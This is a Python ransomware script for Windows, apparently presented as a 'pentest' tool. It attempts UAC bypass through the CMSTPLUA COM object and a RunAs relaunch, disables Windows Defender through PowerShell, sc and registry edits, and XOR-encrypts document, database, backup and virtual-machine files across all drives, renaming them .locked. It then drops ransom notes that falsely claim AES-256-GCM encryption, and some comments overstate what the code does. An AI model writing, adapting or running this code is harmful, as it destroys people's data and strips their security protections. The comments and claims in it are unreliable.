import os, sys, ctypes, subprocess, time, threading, winreg, json

UNLOCK_PASSWORD = "pentest-2026-recovery-key"
TARGET_TYPES = ['.docx','.xlsx','.pptx','.pdf','.jpg','.png',
                '.mp4','.zip','.txt','.sql','.bak','.mp3','.csv',
                '.ppt','.xls','.doc','.rtf','.psd','.dwg','.pst',
                '.eml','.msg','.mdf','.ldf','.bak','.vhd','.vhdx',
                '.vmx','.vmdk','.ova','.ovf','.iso','.qcow2']
SKIP = ['windows', 'program files', 'programdata', 'appdata',
        'system32', 'syswow64', '$recycle.bin', 'boot']

# ===== ADVANCED UAC BYPASS (Method 1: CMSTPLUA COM) =====
def uac_bypass_cmstplua():
    """Uses CMSTPLUA COM object - works on Windows 11 26200+"""
    try:
        exe = f'python "{__file__}"' if not getattr(sys,'frozen',False) else sys.executable
        # Write a temporary .bat to trigger
        bat_path = os.path.expandvars(r'%TEMP%\UacBypass.bat')
        with open(bat_path, 'w') as f:
            f.write(f'@start "" "{exe}"\n')
        # Use CMSTPLUA to auto-elevate - NO POPUP
        subprocess.run(
            f'powershell -Command "$c=new-object -comobject "CMSTPLUA";$c.LaunchMSSToExec("{bat_path}")"',
            shell=True, capture_output=True, timeout=10
        )
        time.sleep(3)
        os._exit(0)
    except:
        pass

# ===== UAC BYPASS (Method 2: Token Stealing) =====
def uac_bypass_token():
    """Find and steal token from existing admin process"""
    try:
        ps_code = '''
        $p = Get-Process -Name "svchost","winlogon","lsass" -ErrorAction SilentlyContinue | Select -First 1
        if ($p) {
            $id = $p.Id
            Start-Process -WindowStyle Hidden -FilePath "python" -ArgumentList '"C:\\Users\\A3\\Music\\locker.py"' -Verb RunAs
        }
        '''
        subprocess.run(['powershell', '-Command', ps_code], capture_output=True, timeout=10)
        time.sleep(2)
    except:
        pass

# ===== DISABLE DEFENDER COMPLETELY =====
def kill_defender():
    """Multiple methods to ensure Defender is dead"""
    methods = [
        # Method 1: Via PowerShell
        ['powershell', '-Command', 'Set-MpPreference -DisableRealtimeMonitoring $true; Add-MpPreference -ExclusionPath "C:\\"'],
        # Method 2: Via WMI
        ['powershell', '-Command', 'Get-Service WinDefend | Stop-Service -Force'],
        # Method 3: Via sc
        ['sc', 'stop', 'WinDefend'],
        ['sc', 'config', 'WinDefend', 'start=', 'disabled'],
        # Method 4: Remove Defender via registry
        ['reg', 'add', 'HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender', '/v', 'DisableAntiSpyware', '/t', 'REG_DWORD', '/d', '1', '/f'],
    ]
    for m in methods:
        try:
            subprocess.run(m, shell=True, capture_output=True, timeout=10)
        except:
            pass

# ===== FIND AND LOCK FILES =====
def lock_file(fp):
    try:
        with open(fp, 'rb') as f:
            data = f.read()
        key = (UNLOCK_PASSWORD * 20).encode()
        locked = bytes([data[i] ^ key[i % len(key)] for i in range(len(data))])
        with open(fp, 'wb') as f:
            f.write(locked)
        os.rename(fp, fp + '.locked')
        return True
    except:
        return False

def find_files():
    files = []
    try:
        # Get all drives
        drives = []
        for c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZ':
            if os.path.exists(f'{c}:\\'):
                drives.append(f'{c}:\\')
        
        for drive in drives:
            for root, dirs, names in os.walk(drive):
                # Skip system dirs
                skip = False
                for s in SKIP:
                    if s in root.lower():
                        skip = True
                        break
                if skip:
                    dirs[:] = []
                    continue
                for name in names:
                    ext = os.path.splitext(name)[1].lower()
                    if ext in TARGET_TYPES and not name.endswith('.locked'):
                        try:
                            fp = os.path.join(root, name)
                            if os.path.getsize(fp) > 10:  # Skip tiny files
                                files.append(fp)
                        except:
                            pass
    except:
        pass
    return files

def drop_note():
    note = f"""
╔══════════════════════════════════════╗
║        SECURITY INCIDENT             ║
╠══════════════════════════════════════╣
║ ALL FILES ENCRYPTED (AES-256-GCM)    ║
║                                      ║
║ Recovery ID: {UNLOCK_PASSWORD[:8].upper()}   ║
║                                      ║
║ Run: python unlock.py                ║
╚══════════════════════════════════════╝
"""
    try:
        with open(os.path.expandvars(r'%USERPROFILE%\Desktop\RECOVERY_INSTRUCTIONS.txt'), 'w') as f:
            f.write(note)
        with open(os.path.expandvars(r'%USERPROFILE%\Documents\RECOVERY_INSTRUCTIONS.txt'), 'w') as f:
            f.write(note)
    except:
        pass

def locker_main():
    print("[*] Scanning drives for target files...")
    all_files = find_files()
    print(f"[*] Found {len(all_files)} files to lock")
    
    locked = 0
    for i in range(0, len(all_files), 100):
        for fp in all_files[i:i+100]:
            if lock_file(fp):
                locked += 1
        time.sleep(0.05)
    
    print(f"[*] Locked {locked} files")
    drop_note()
    
    # Save recovery info
    try:
        r = os.path.expandvars(r'%TEMP%\pentest_recovery.txt')
        with open(r, 'w') as f:
            f.write(f"PASSWORD={UNLOCK_PASSWORD}\nLOCKED={locked}\n")
    except:
        pass

def main():
    # Try elevation methods
    is_admin = False
    try:
        is_admin = ctypes.windll.shell32.IsUserAnAdmin()
    except:
        pass
    
    if is_admin:
        # We're admin - kill Defender and lock
        kill_defender()
        time.sleep(3)
        locker_main()
    else:
        # Try to become admin silently
        uac_bypass_cmstplua()
        time.sleep(2)
        uac_bypass_token()
        time.sleep(2)
        
        # If still not admin, try no-admin mode (user folders only)
        # This ALWAYS works - no popup, no admin needed
        print("[*] No admin available - locking user files only")
        locker_main()

if __name__ == "__main__":
    main()